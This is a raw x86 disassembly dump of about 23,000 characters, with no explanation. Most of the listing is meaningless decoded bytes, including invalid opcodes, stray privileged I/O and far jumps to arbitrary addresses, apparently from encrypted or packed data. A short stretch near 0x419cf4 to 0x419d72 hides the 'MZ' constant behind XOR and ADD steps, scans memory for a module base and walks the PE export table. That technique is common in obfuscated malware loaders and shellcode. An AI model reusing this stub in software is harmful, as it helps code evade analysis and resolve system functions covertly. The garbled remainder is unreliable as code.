  419759:	xor    BYTE PTR [ecx-0x54219866],ah
  41975f:	imul   ecx,DWORD PTR [ebx+0x42d822c2],0xfffffffd
  419766:	lds    ebx,FWORD PTR [edx-0xfa53e02]
  41976c:	push   ds
  41976d:	lods   al,BYTE PTR ds:[esi]
  41976e:	mov    ch,0xc0
  419770:	shr    DWORD PTR [edi-0x6839beec],0x3a
  419777:	(bad)  
  41977a:	pop    es
  41977b:	sbb    BYTE PTR [edx-0x56c80eab],cl
  419781:	jbe    0x419741
  419783:	(bad)  
  419784:	ins    DWORD PTR es:[edi],dx
  419785:	mov    ch,0xdd
  419787:	jne    0x41976e
  419789:	adc    DWORD PTR [ebx*4-0x445d3d8e],edi
  419790:	mov    cl,BYTE PTR [edi-0x34]
  419793:	enter  0x46ef,0x8c
  419797:	arpl   WORD PTR [edx],ax
  419799:	sub    BYTE PTR [edi-0x7390bff5],0xd8
  4197a0:	outs   dx,BYTE PTR ds:[esi]
  4197a1:	pop    esi
  4197a2:	outs   dx,DWORD PTR ds:[esi]
  4197a3:	stc    
  4197a4:	mov    esi,eax
  4197a6:	jg     0x4197b8
  4197a8:	hlt    
  4197a9:	into   
  4197aa:	inc    ecx
  4197ab:	cmp    al,0x21
  4197ad:	or     esi,edi
  4197af:	mov    ah,0xd
  4197b1:	in     al,0x5e
  4197b3:	ret    
  4197b4:	std    
  4197b5:	mov    ds:0xf3c4eaf8,eax
  4197ba:	imul   ebx,DWORD PTR [ecx],0x1d
  4197bd:	or     ah,BYTE PTR [edx+0x7a]
  4197c0:	inc    eax
  4197c1:	or     DWORD PTR [eax+0x12],ebp
  4197c4:	push   edx
  4197c5:	invd   
  4197c7:	cli    
  4197c8:	jmp    0x419780
  4197ca:	outs   dx,BYTE PTR ds:[esi]
  4197cb:	sub    al,0x3b
  4197cd:	xchg   ebx,eax
  4197ce:	xchg   edx,eax
  4197cf:	xor    al,0xe7
  4197d1:	dec    ebp
  4197d2:	pop    edi
  4197d3:	push   edx
  4197d4:	aas    
  4197d5:	push   ebx
  4197d6:	or     BYTE PTR [edx-0x48],cl
  4197d9:	xchg   esp,eax
  4197da:	call   0x3fe9:0xae459478
  4197e1:	xchg   ecx,eax
  4197e2:	xor    DWORD PTR [ebx+ebx*4+0x65],esp
  4197e6:	cmp    DWORD PTR [esi+0x12],edx
  4197e9:	fldenv [ebx+0x4a6eeb74]
  4197ef:	inc    esi
  4197f0:	jge    0x4197f3
  4197f2:	cmc    
  4197f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197f4:	jp     0x4197d0
  4197f6:	sub    DWORD PTR [edx],eax
  4197f8:	fidivr WORD PTR ds:0x9356463d
  4197fe:	xchg   ebx,eax
  4197ff:	and    al,0x6c
  419801:	sbb    ebp,eax
  419803:	inc    eax
  419804:	sub    ebp,esp
  419806:	pop    edx
  419807:	pop    ss
  419808:	jae    0x419834
  41980a:	mov    WORD PTR [esi],ss
  41980c:	jno    0x419808
  41980e:	nop
  41980f:	and    eax,0x3695f013
  419814:	dec    esp
  419815:	push   ecx
  419816:	sbb    DWORD PTR [edi+0x1c143eed],edi
  41981c:	dec    eax
  41981d:	sbb    edi,ecx
  41981f:	ins    DWORD PTR es:[edi],dx
  419820:	inc    BYTE PTR [edx]
  419822:	lds    esi,FWORD PTR [esi+ecx*2+0x53]
  419826:	sbb    bl,dl
  419828:	mov    edx,0x521d54cf
  41982d:	hlt    
  41982e:	std    
  41982f:	mov    bl,BYTE PTR [ecx]
  419831:	sub    DWORD PTR [edx],0xe
  419834:	mov    dh,0x60
  419837:	sbb    al,0xd2
  419839:	dec    BYTE PTR [ebp+0x33]
  41983c:	lock and DWORD PTR [ebx-0x1a61884b],ebp
  419843:	pop    ecx
  419844:	stos   BYTE PTR es:[edi],al
  419845:	mov    bh,0x94
  419847:	lods   eax,DWORD PTR ds:[esi]
  419848:	arpl   WORD PTR [ecx],ax
  41984a:	ja     0x4197f7
  41984c:	leave  
  41984d:	repnz test al,0x2d
  419850:	sbb    eax,DWORD PTR [ebx+0x73bda895]
  419856:	xlat   BYTE PTR ds:[ebx]
  419857:	jg     0x419889
  419859:	popf   
  41985a:	add    DWORD PTR [ebx+0x6be640d7],ebx
  419860:	lods   al,BYTE PTR ds:[esi]
  419861:	mov    edi,?
  419863:	in     al,dx
  419864:	cli    
  419865:	mov    cl,0x55
  419867:	mov    eax,ds:0x1b9a209d
  41986c:	mov    DWORD PTR [ecx],esp
  41986e:	cwde   
  41986f:	(bad)  
  419870:	ins    DWORD PTR es:[edi],dx
  419871:	mov    dh,0xf4
  419873:	test   DWORD PTR [ecx+0x5161ade6],ecx
  419879:	loop   0x41981d
  41987b:	test   al,0x78
  41987d:	inc    edi
  41987e:	jl     0x4198ab
  419880:	inc    esp
  419881:	jg     0xfc4a5be5
  419887:	mov    edx,0xa8216cf8
  41988c:	and    al,0x71
  41988e:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  419890:	sub    eax,0xba3d124d
  419895:	and    al,0xb3
  419897:	or     BYTE PTR [ecx],al
  419899:	shr    BYTE PTR [edx*4+0x708e6dbc],0x2f
  4198a1:	jno    0x419867
  4198a3:	aas    
  4198a4:	in     al,0x23
  4198a6:	popw   ds
  4198a8:	test   al,0x61
  4198aa:	add    al,0x20
  4198ac:	dec    edx
  4198ad:	lds    edi,FWORD PTR [ecx]
  4198af:	inc    ebx
  4198b0:	(bad)  
  4198b1:	rcl    ah,0xa5
  4198b4:	mov    BYTE PTR [edx-0x6e],ah
  4198b7:	push   edx
  4198b8:	mov    esp,?
  4198ba:	mov    gs,WORD PTR [ecx-0xa1bf4ab]
  4198c0:	pop    eax
  4198c1:	imul   edi,DWORD PTR ds:0x4a03e203,0xcd672c3a
  4198cb:	sub    ebx,ecx
  4198cd:	das    
  4198ce:	pop    edx
  4198cf:	xchg   al,cl
  4198d1:	outs   dx,DWORD PTR ds:[esi]
  4198d2:	aad    0xae
  4198d4:	test   al,0xb1
  4198d6:	repnz adc DWORD PTR [edi-0x1e],0xed7f5bc5
  4198de:	jge    0x41987f
  4198e0:	sbb    dh,BYTE PTR [ecx-0x15]
  4198e3:	mov    eax,cs
  4198e5:	and    dh,dh
  4198e7:	mov    BYTE PTR ds:0xc3fc9bb6,bh
  4198ed:	(bad)  
  4198ee:	cmp    eax,0x767c252d
  4198f3:	mov    ebx,DWORD PTR [eax+ebx*4+0x54103507]
  4198fa:	pop    edi
  4198fb:	scas   al,BYTE PTR es:[edi]
  4198fc:	push   edx
  4198fd:	sub    DWORD PTR [esi-0x5f],0xfffffff1
  419901:	pop    edx
  419902:	xchg   DWORD PTR [ecx+0x3f],edi
  419905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419906:	sub    al,BYTE PTR [ebx-0x7e]
  419909:	inc    ebp
  41990a:	ss cwde 
  41990c:	adc    DWORD PTR [edx-0x70166211],0x26
  419913:	outs   dx,BYTE PTR ds:[esi]
  419914:	inc    esp
  419915:	fcmove st,st(3)
  419917:	pop    esi
  419918:	scas   eax,DWORD PTR es:[edi]
  419919:	lods   eax,DWORD PTR ds:[esi]
  41991a:	add    BYTE PTR [ebx+0x6ab601ca],ch
  419920:	sbb    ebp,DWORD PTR [eax]
  419922:	shr    BYTE PTR [ebx+0x3241d504],0x2b
  419929:	cmp    DWORD PTR [edi-0x62b59835],ebx
  41992f:	pop    edi
  419930:	nop
  419931:	imul   esp,DWORD PTR ss:[edi+0x41],0x7f9877fc
  419939:	mov    eax,0x29d5840d
  41993e:	push   edi
  41993f:	stos   BYTE PTR es:[edi],al
  419940:	xor    cl,BYTE PTR [ebx-0x300e454a]
  419946:	jg     0x419977
  419948:	inc    edx
  419949:	ficomp DWORD PTR [ecx+ebp*1-0x3339365a]
  419950:	fisubr WORD PTR [edi]
  419952:	lods   al,BYTE PTR ds:[esi]
  419953:	shr    ebp,1
  419955:	fsubr  st,st(7)
  419957:	(bad)  
  419958:	or     eax,0x34176297
  41995d:	xor    ah,ch
  41995f:	(bad)  
  419960:	loop   0x419965
  419962:	push   es
  419963:	sbb    cl,cl
  419965:	jnp    0x419929
  419967:	pop    ds
  419968:	mov    ecx,0xc15aafd7
  41996d:	dec    eax
  41996e:	and    eax,0xf493d000
  419973:	cld    
  419974:	jo     0x419943
  419976:	cwde   
  419977:	lea    ecx,[ebx+0x2c]
  41997a:	rcr    esp,cl
  41997c:	aaa    
  41997d:	(bad)  
  41997e:	clc    
  41997f:	sub    eax,DWORD PTR [ecx-0x3b]
  419982:	ins    BYTE PTR es:[edi],dx
  419983:	cmp    eax,0x895876e8
  419988:	cmp    esp,DWORD PTR [edx-0x6f8542a3]
  41998e:	jle    0x419978
  419990:	jbe    0x4199b9
  419992:	lds    ebp,FWORD PTR [ebp-0x21]
  419995:	cmp    eax,0xa40d7719
  41999a:	add    BYTE PTR [esi-0x10bf122f],0x27
  4199a1:	xchg   ebx,eax
  4199a2:	cld    
  4199a3:	mov    ebp,0x992f649f
  4199a8:	mov    ch,0xe3
  4199aa:	push   ss
  4199ab:	cs out dx,al
  4199ad:	xor    edx,DWORD PTR es:[esp+eax*4-0x31]
  4199b2:	pop    ebp
  4199b3:	shr    DWORD PTR [ebp+ebx*8+0x201f50c7],1
  4199ba:	sub    BYTE PTR [eax+0x67],bh
  4199bd:	push   ecx
  4199be:	call   FWORD PTR [esi-0x53]
  4199c1:	push   ss
  4199c2:	pop    ss
  4199c3:	out    dx,al
  4199c4:	arpl   sp,si
  4199c6:	or     bh,ah
  4199c8:	push   edi
  4199c9:	push   edi
  4199ca:	ss mov bh,0xd8
  4199cd:	adc    DWORD PTR [esi+ebp*4],edx
  4199d0:	mov    al,ds:0x4bc4e69c
  4199d5:	push   ecx
  4199d6:	in     al,dx
  4199d7:	mov    esi,DWORD PTR [eax+0x36ddadc8]
  4199dd:	pusha  
  4199de:	out    0x61,eax
  4199e0:	dec    ecx
  4199e1:	xor    BYTE PTR [esi-0x2c],0xf9
  4199e5:	imul   edi,DWORD PTR [esi-0x3e957c99],0x60
  4199ec:	cmp    al,0x32
  4199ee:	mov    WORD PTR [eax+0x78a7fbf3],gs
  4199f4:	dec    edx
  4199f5:	lods   al,BYTE PTR ds:[esi]
  4199f6:	jns    0x419a3a
  4199f8:	and    DWORD PTR cs:[ebx-0xb],esi
  4199fc:	fisttp QWORD PTR [ebx+0x198a5e0e]
  419a02:	sub    al,BYTE PTR [eax+0x6b]
  419a05:	mov    al,ds:0x7176e167
  419a0a:	add    eax,0x3b729e20
  419a0f:	xor    ecx,DWORD PTR ds:0xea38116e
  419a15:	dec    ecx
  419a16:	pop    ebp
  419a17:	inc    eax
  419a18:	out    0x51,eax
  419a1a:	pop    edi
  419a1b:	leave  
  419a1c:	inc    edi
  419a1d:	mov    dl,ch
  419a1f:	mov    ah,0xd9
  419a21:	sub    BYTE PTR [ecx+ebp*1],0x81
  419a25:	or     al,0x99
  419a27:	clc    
  419a28:	push   eax
  419a29:	mov    ebp,DWORD PTR [edx+0x2]
  419a2c:	push   cs
  419a2d:	mov    al,0xf5
  419a2f:	icebp  
  419a30:	scas   al,BYTE PTR es:[edi]
  419a31:	sbb    dh,BYTE PTR [eax+edi*4+0x1e]
  419a35:	jmp    0x4199ee
  419a37:	push   ecx
  419a38:	push   0x1c
  419a3a:	cdq    
  419a3b:	push   cs
  419a3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a3d:	out    0x98,al
  419a3f:	xor    bh,ch
  419a41:	push   edx
  419a42:	or     BYTE PTR [eax-0x2f],0x1
  419a46:	call   0x75fb819
  419a4b:	dec    edx
  419a4c:	popf   
  419a4d:	test   esi,0x94977e31
  419a53:	repnz and ebp,ebp
  419a56:	dec    edi
  419a57:	xlat   BYTE PTR ds:[ebx]
  419a58:	mov    dl,0xde
  419a5a:	adc    eax,0x3064d4dc
  419a5f:	das    
  419a60:	jae    0x419a29
  419a62:	int    0x89
  419a64:	call   0xa20c:0x376a343
  419a6b:	das    
  419a6c:	sbb    esp,esi
  419a6e:	fisttp DWORD PTR [ebp-0x74]
  419a71:	mov    eax,0x3df4efc4
  419a76:	cdq    
  419a77:	aas    
  419a78:	cli    
  419a79:	les    edi,FWORD PTR [edi]
  419a7b:	sbb    DWORD PTR [ecx+0x75],esp
  419a7e:	and    ebp,DWORD PTR [ecx+0x3d9ec017]
  419a84:	adc    edx,edx
  419a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a87:	iret   
  419a88:	outs   dx,DWORD PTR ds:[esi]
  419a89:	fwait
  419a8a:	jmp    0x56e4cca9
  419a8f:	das    
  419a90:	mov    dl,0x1a
  419a92:	into   
  419a93:	retf   
  419a94:	fild   DWORD PTR [ebp+0x37f60a78]
  419a9a:	push   edx
  419a9b:	(bad)  
  419a9c:	push   esp
  419a9d:	or     ah,dh
  419a9f:	cmp    BYTE PTR [ecx-0x28f86907],al
  419aa5:	les    eax,FWORD PTR [ebp-0x70]
  419aa8:	sbb    BYTE PTR [esi+0x7d],ch
  419aab:	cwde   
  419aac:	aad    0xd6
  419aae:	pushf  
  419aaf:	xor    BYTE PTR ds:0x63cb8cc5,cl
  419ab5:	mov    bl,0xf6
  419ab7:	(bad)  
  419ab8:	idiv   DWORD PTR [edx]
  419aba:	ins    BYTE PTR es:[edi],dx
  419abb:	fprem1 
  419abd:	pop    ds
  419abe:	outs   dx,DWORD PTR ds:[esi]
  419abf:	xor    ebx,DWORD PTR [edx]
  419ac1:	leave  
  419ac2:	out    0x4,eax
  419ac4:	add    BYTE PTR [ebp+0x33],dh
  419ac7:	mov    ds:0xd010543c,eax
  419acc:	adc    ebx,esp
  419ace:	(bad)  
  419acf:	mov    edx,edx
  419ad1:	pop    ds
  419ad2:	mov    esp,0x2812c826
  419ad7:	inc    ebp
  419ad8:	repnz not edi
  419adb:	jmp    0x419abc
  419add:	int    0xce
  419adf:	mov    cl,dh
  419ae1:	sar    BYTE PTR [edx+edi*1-0x74],1
  419ae5:	mov    esi,0x5b88261f
  419aea:	and    esp,DWORD PTR [esi+0x1ee43b9]
  419af0:	(bad)  
  419af1:	or     eax,DWORD PTR ds:[eax-0x8]
  419af5:	mov    esp,DWORD PTR [ebx]
  419af7:	inc    eax
  419af8:	push   esp
  419af9:	jb     0x419b72
  419afb:	outs   dx,BYTE PTR ds:[esi]
  419afc:	std    
  419afd:	lahf   
  419afe:	addr16 push 0x31f9b08f
  419b04:	es jne 0x419b03
  419b07:	jle    0x419b66
  419b09:	sub    al,0xe3
  419b0b:	dec    edx
  419b0c:	enter  0x6cda,0xba
  419b10:	inc    edx
  419b11:	(bad)  
  419b12:	retf   0xa114
  419b15:	ins    DWORD PTR es:[edi],dx
  419b16:	call   DWORD PTR [ebp-0x40]
  419b19:	sbb    ebx,ebx
  419b1b:	sub    al,0x2f
  419b1d:	jg     0x419b6b
  419b1f:	xor    al,0x8b
  419b21:	jmp    0x249ce30c
  419b26:	pop    esi
  419b27:	les    eax,FWORD PTR [ecx]
  419b29:	in     al,dx
  419b2a:	mov    al,ds:0xce73bda1
  419b2f:	sub    DWORD PTR [ebx+0x7c87d5b2],esp
  419b35:	mov    eax,0xb0fa4dc4
  419b3a:	add    DWORD PTR [edi+0x36],esp
  419b3d:	push   ecx
  419b3e:	sub    esp,DWORD PTR [ebp-0x1d]
  419b41:	mov    ch,0x46
  419b43:	or     BYTE PTR [edi+0x40],0x74
  419b47:	jno    0x419b02
  419b49:	pop    edi
  419b4a:	pop    eax
  419b4b:	dec    esp
  419b4c:	mov    al,0x1c
  419b4e:	mov    WORD PTR [edi+0x54dff3ad],ds
  419b54:	(bad)
  419b57:	jecxz  0x419b1e
  419b59:	repnz push ss
  419b5b:	push   ds
  419b5c:	inc    ebp
  419b5d:	xor    al,0xdb
  419b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b61:	mov    ss,esp
  419b63:	data16 aam 0x57
  419b66:	jb     0x419b34
  419b68:	adc    DWORD PTR [edi],0xffffffbe
  419b6b:	aam    0x9b
  419b6d:	aad    0x1c
  419b6f:	sbb    DWORD PTR [esi-0x1bd52bf0],esp
  419b75:	adc    esi,DWORD PTR [esi]
  419b77:	ret    0x1c8b
  419b7a:	xchg   ebx,eax
  419b7b:	int    0x95
  419b7d:	push   0x15a3c9a1
  419b82:	pop    edx
  419b83:	cdq    
  419b84:	sti    
  419b85:	test   BYTE PTR [esp+ebp*1+0x36],bl
  419b89:	out    dx,al
  419b8a:	out    dx,al
  419b8b:	xor    ebp,DWORD PTR [esi-0x73]
  419b8e:	mov    esp,0x9ee3dfa4
  419b93:	inc    edi
  419b94:	mov    ds:0x4c9f21,al
  419b99:	fidiv  DWORD PTR [esi-0x230324cf]
  419b9f:	sar    BYTE PTR [edi+0x209769b0],cl
  419ba5:	push   0xffffffbf
  419ba7:	add    eax,0x6f76b3cf
  419bac:	cmp    al,0x89
  419bae:	or     ebx,DWORD PTR [edi+ecx*1+0x191c59ed]
  419bb5:	adc    eax,ebp
  419bb7:	ins    DWORD PTR es:[edi],dx
  419bb8:	les    eax,FWORD PTR [ecx*8-0x6484b719]
  419bbf:	ins    DWORD PTR es:[edi],dx
  419bc0:	hlt    
  419bc1:	sub    ebp,ecx
  419bc3:	cli    
  419bc4:	aam    0x18
  419bc6:	shl    DWORD PTR [edx],cl
  419bc8:	pusha  
  419bc9:	cs inc ecx
  419bcb:	jg     0x419ba6
  419bcd:	pop    edi
  419bce:	sub    BYTE PTR [ebp+0x7f150028],ah
  419bd4:	shr    edx,0x24
  419bd7:	fidiv  WORD PTR [esi]
  419bd9:	lds    ecx,FWORD PTR [esi]
  419bdb:	pop    ebp
  419bdc:	test   DWORD PTR [edi-0x35],ebp
  419bdf:	push   esi
  419be0:	shr    ebx,0xdc
  419be3:	xor    dh,BYTE PTR [eax]
  419be5:	push   0x89ebb26a
  419bea:	mov    bh,0x4d
  419bec:	pusha  
  419bed:	mov    bl,cl
  419bef:	test   al,0x27
  419bf1:	cli    
  419bf2:	pop    ds
  419bf3:	dec    edx
  419bf4:	dec    edx
  419bf5:	or     eax,0x48d05149
  419bfa:	mov    ebx,0x6ba379ed
  419bff:	dec    edi
  419c00:	pop    esi
  419c01:	arpl   WORD PTR [ecx],bx
  419c03:	mov    ecx,0x2038b2be
  419c08:	xor    DWORD PTR [esi-0x370e31b1],esp
  419c0e:	sub    al,0x5f
  419c10:	push   0x21
  419c12:	inc    ebx
  419c13:	call   0x5356:0xde51a7c2
  419c1a:	nop
  419c1b:	jae    0x419bdc
  419c1d:	sti    
  419c1e:	adc    bh,BYTE PTR [ebx]
  419c20:	inc    ebp
  419c21:	dec    ebx
  419c22:	add    eax,0x3ac6bc74
  419c27:	xor    ecx,DWORD PTR [esp+eiz*2-0x63]
  419c2b:	inc    eax
  419c2c:	setnp  BYTE PTR [edi+ebx*8+0x5b406514]
  419c34:	xchg   edi,eax
  419c35:	push   0x5f
  419c37:	ss into 
  419c39:	ficom  DWORD PTR [ecx]
  419c3b:	mov    edi,0x64dbcb25
  419c40:	(bad)  
  419c42:	or     DWORD PTR [esi],ebp
  419c44:	or     dh,bl
  419c46:	sahf   
  419c47:	fnstcw WORD PTR [bx+si]
  419c4a:	or     eax,0xa1b9f39f
  419c4f:	(bad)  
  419c50:	js     0x419c02
  419c52:	idiv   BYTE PTR [eax+0x1101cf93]
  419c58:	ror    dh,1
  419c5a:	popf   
  419c5b:	rol    BYTE PTR [edx+0x24ec869],cl
  419c61:	fwait
  419c62:	mov    ebp,0x52dc9293
  419c67:	cld    
  419c68:	pop    ecx
  419c69:	xchg   ebx,eax
  419c6a:	mov    ebx,0x76c40181
  419c6f:	mov    ah,0xdb
  419c71:	pop    esp
  419c72:	lahf   
  419c73:	leave  
  419c74:	xor    al,0xdf
  419c76:	mov    edi,0x1852bd56
  419c7b:	int    0x15
  419c7d:	loop   0x419c90
  419c7f:	mov    bh,0x20
  419c81:	or     BYTE PTR [ecx],bl
  419c83:	pop    eax
  419c84:	add    esp,DWORD PTR [ecx]
  419c86:	xor    esp,esi
  419c88:	retf   0xf374
  419c8b:	pusha  
  419c8c:	and    al,0x18
  419c8e:	jg     0x419c31
  419c90:	(bad)  
  419c91:	push   0xffffff9d
  419c93:	sbb    eax,0x8602fc51
  419c98:	xchg   ebp,eax
  419c99:	mov    edx,0xdacb4e8f
  419c9e:	int    0x1c
  419ca0:	mov    eax,ds:0x3be19c1
  419ca5:	scas   al,BYTE PTR es:[edi]
  419ca6:	mov    BYTE PTR [esi-0x7a3d3e68],dl
  419cac:	ret    0x143e
  419caf:	jno    0x419ce8
  419cb1:	out    dx,eax
  419cb2:	aas    
  419cb3:	pop    edx
  419cb4:	jg     0x419c65
  419cb6:	repz mov eax,DWORD PTR [edx+ebx*1+0x3]
  419cbb:	dec    esp
  419cbc:	ds ss mov ch,0xb6
  419cc0:	xchg   ecx,eax
  419cc1:	inc    edx
  419cc2:	pop    ecx
  419cc3:	mov    ch,0x55
  419cc5:	test   eax,0xd091733b
  419cca:	mov    cl,0xcc
  419ccc:	fstp   DWORD PTR [edi+0x64]
  419ccf:	xchg   edx,eax
  419cd0:	jae    0x419c9b
  419cd2:	mov    bh,0xeb
  419cd4:	jecxz  0x419cec
  419cd6:	lods   eax,DWORD PTR ds:[esi]
  419cd7:	loop   0x419cf5
  419cd9:	or     DWORD PTR [ebx-0x4482549f],esp
  419cdf:	pop    eax
  419ce0:	mov    eax,0x391caf0a
  419ce5:	xor    al,0x30
  419ce7:	cmp    al,0xfa
  419ce9:	and    ebp,DWORD PTR fs:[esi-0x75]
  419ced:	pop    ebp
  419cee:	fmul   DWORD PTR [ebx-0x39dc2383]
  419cf4:	mov    esi,0xa147
  419cf9:	xor    bx,si
  419cfc:	mov    esi,0x4133
  419d01:	add    bx,si
  419d04:	cmp    WORD PTR [eax],bx
  419d07:	je     0x419d51
  419d0d:	mov    edi,DWORD PTR [ebp-0x10]
  419d10:	xor    edi,ecx
  419d12:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  419d19:	mov    DWORD PTR [ebp-0x24],0xffffffff
  419d20:	mov    ebx,0xffcd8d06
  419d25:	sub    ebx,edi
  419d27:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  419d2e:	add    eax,ebx
  419d30:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  419d37:	mov    edi,DWORD PTR [ebp-0x28]
  419d3a:	mov    ebx,DWORD PTR [ebp-0x24]
  419d3d:	mov    ebx,0xa147
  419d42:	xor    di,bx
  419d45:	add    di,si
  419d48:	cmp    WORD PTR [eax],di
  419d4b:	jne    0x419d0d
  419d51:	mov    edi,DWORD PTR [ebp-0x14]
  419d54:	mov    edi,DWORD PTR [edi]
  419d56:	mov    ebx,DWORD PTR [eax+0x3c]
  419d59:	lea    edi,[ebx+edi*8+0x78]
  419d5d:	mov    edi,DWORD PTR [edi+eax*1]
  419d60:	mov    DWORD PTR [ebp-0x18],edi
  419d63:	mov    edi,DWORD PTR [ebp+0x8]
  419d66:	xor    edi,ecx
  419d68:	add    edi,edx
  419d6a:	mov    DWORD PTR [ebp-0x1c],edi
  419d6d:	mov    edi,DWORD PTR [ebp+0x8]
  419d70:	xor    edi,ecx
  419d72:	jmp    0x41c0fe
  419d77:	dec    ecx
  419d78:	mov    edi,0x37790f77
  419d7d:	imul   ebx,ecx,0x2d995a11
  419d83:	xor    BYTE PTR [edx+esi*4+0x52],bl
  419d87:	cmc    
  419d88:	fnstsw WORD PTR [edx+0x7b]
  419d8b:	call   0x18bd192c
  419d90:	adc    DWORD PTR [ebx],0xffffffe4
  419d93:	mov    gs,WORD PTR [ecx+0x722ae6f3]
  419d99:	ror    DWORD PTR [edi],cl
  419d9b:	jle    0x419d23
  419d9d:	aam    0xc0
  419d9f:	jnp    0x419e07
  419da1:	xor    ch,BYTE PTR cs:[ebp-0x39]
  419da5:	cli    
  419da6:	imul   ebp,DWORD PTR [esi+0x21],0xeaa6308c
  419dad:	mov    esi,0x29852e7d
  419db2:	dec    esi
  419db3:	icebp  
  419db4:	sub    edx,0xffffffa8
  419db7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419db8:	(bad)  
  419db9:	xchg   BYTE PTR [ecx-0x14],bh
  419dbc:	jp     0x419d64
  419dbe:	sahf   
  419dbf:	ret    0xd8da
  419dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dc3:	imul   esi,DWORD PTR [eax+0x6d],0x12
  419dc7:	mov    dh,0x60
  419dc9:	jecxz  0x419e38
  419dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dcc:	aam    0xb9
  419dce:	dec    ebp
  419dcf:	or     BYTE PTR [edx-0x18],0xc0
  419dd3:	cmc    
  419dd4:	sbb    al,0xec
  419dd6:	cmp    al,0x5e
  419dd8:	popa   
  419dd9:	daa    
  419dda:	fisubr DWORD PTR [ebp-0x5b1f3a73]
  419de0:	add    al,0x27
  419de2:	and    al,0xf4
  419de4:	es pop ebp
  419de6:	xchg   esp,eax
  419de7:	xchg   ecx,eax
  419de8:	test   eax,0xe4dbaa58
  419ded:	jmp    0xb223:0x6edcf8bc
  419df4:	mul    DWORD PTR [edi-0x348b7c05]
  419dfa:	sbb    ecx,DWORD PTR [ecx]
  419dfc:	push   ebp
  419dfe:	sahf   
  419dff:	jmp    esp
  419e01:	mov    esi,0x3e2274d2
  419e06:	mov    WORD PTR [eax-0x18],cs
  419e09:	in     al,0xf6
  419e0b:	add    eax,0xeb027c93
  419e10:	inc    eax
  419e11:	(bad)  
  419e12:	je     0x419d98
  419e14:	clc    
  419e15:	xlat   BYTE PTR ds:[ebx]
  419e16:	jb     0x419e54
  419e18:	adc    BYTE PTR [esi-0x57fdc1f2],0x3b
  419e1f:	adc    al,0xbc
  419e21:	je     0x419e14
  419e23:	xchg   ebp,eax
  419e24:	cwde   
  419e25:	fld    TBYTE PTR [eax-0x32]
  419e28:	push   es
  419e29:	mov    edi,edx
  419e2b:	ret    0x37f2
  419e2e:	add    esp,ebp
  419e30:	xor    dh,dh
  419e32:	pop    eax
  419e33:	test   edi,ebx
  419e35:	retf   
  419e36:	ret    
  419e37:	(bad)  
  419e38:	in     eax,dx
  419e39:	pop    ebx
  419e3a:	and    DWORD PTR [eax-0x4b7bf49d],0x982b6fcb
  419e44:	jmp    0x34cbbab2
  419e49:	mov    dh,BYTE PTR [ebp-0x71]
  419e4c:	mov    ch,0x35
  419e4e:	push   edi
  419e4f:	add    al,0x5c
  419e51:	sbb    al,0x3c
  419e53:	mov    eax,0xa0928fa0
  419e58:	popa   
  419e59:	mov    dl,0x25
  419e5b:	pop    esi
  419e5c:	add    DWORD PTR [esi-0x53],ebx
  419e5f:	xchg   ecx,eax
  419e60:	pusha  
  419e61:	and    BYTE PTR [ecx+edi*8],0xdb
  419e65:	push   eax
  419e66:	cmp    DWORD PTR [edi-0x398f0f69],esi
  419e6c:	jge    0x419eeb
  419e6e:	call   0xe43775bd
  419e73:	mov    bl,0xa8
  419e75:	enter  0x4ca,0xa8
  419e79:	dec    ebp
  419e7a:	outs   dx,DWORD PTR ds:[esi]
  419e7b:	mov    ds:0x7aa004d6,al
  419e80:	outs   dx,DWORD PTR ds:[esi]
  419e81:	and    esi,ecx
  419e83:	pusha  
  419e84:	dec    esi
  419e85:	sbb    bh,BYTE PTR [esi]
  419e87:	mov    ebx,0x7c858d5f
  419e8c:	ins    BYTE PTR es:[edi],dx
  419e8d:	call   0xf44a:0xe0a5b6d7
  419e94:	cmp    BYTE PTR [edx],dh
  419e96:	aam    0xdd
  419e98:	lahf   
  419e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e9a:	sar    BYTE PTR [ebx-0x30863282],0x5c
  419ea1:	mul    eax
  419ea3:	and    bl,BYTE PTR [ebx]
  419ea5:	mov    DWORD PTR [ebx+esi*2-0x30],0xbadbc47e
  419ead:	jl     0x419e6d
  419eaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419eb0:	sub    edi,ebp
  419eb2:	jmp    0x419f1c
  419eb4:	or     ah,BYTE PTR [ebx]
  419eb6:	xor    bh,bh
  419eb8:	mov    WORD PTR [ebx+0x63],?
  419ebb:	test   eax,0x3e3d697c
  419ec0:	pop    ds
  419ec1:	jecxz  0x419f1e
  419ec3:	add    dh,BYTE PTR [edx-0x6f]
  419ec6:	pop    ds
  419ec7:	mov    ebx,0x1ee71b00
  419ecc:	neg    DWORD PTR [ecx-0x6b]
  419ecf:	fwait
  419ed0:	and    bl,BYTE PTR [edx-0x63]
  419ed3:	push   ss
  419ed4:	cmp    BYTE PTR [ecx],bl
  419ed6:	jno    0x419f4c
  419ed8:	leave  
  419ed9:	pop    ebp
  419eda:	fwait
  419edb:	int3   
  419edc:	data16 add BYTE PTR [ebp-0x38],0x13
  419ee1:	push   ecx
  419ee2:	dec    esp
  419ee3:	xchg   eax,ecx
  419ee5:	std    
  419ee6:	shl    DWORD PTR [edx],1
  419ee8:	dec    eax
  419ee9:	inc    edi
  419eea:	fadd   DWORD PTR [ebx+0x9]
  419eed:	jl     0x419ebd
  419eef:	cmovg  edx,DWORD PTR [edx-0x52db6b58]
  419ef6:	mov    es,WORD PTR [edx+0x11efa017]
  419efc:	dec    esi
  419efd:	ret    0xea11
  419f00:	push   ds
  419f01:	cmp    eax,0x794eb6aa
  419f06:	rol    DWORD PTR [esi],cl
  419f08:	aaa    
  419f09:	sbb    eax,0xa603aff9
  419f0e:	sbb    BYTE PTR [eax+0x58edc3ad],dl
  419f14:	popa   
  419f15:	out    dx,al
  419f16:	push   ecx
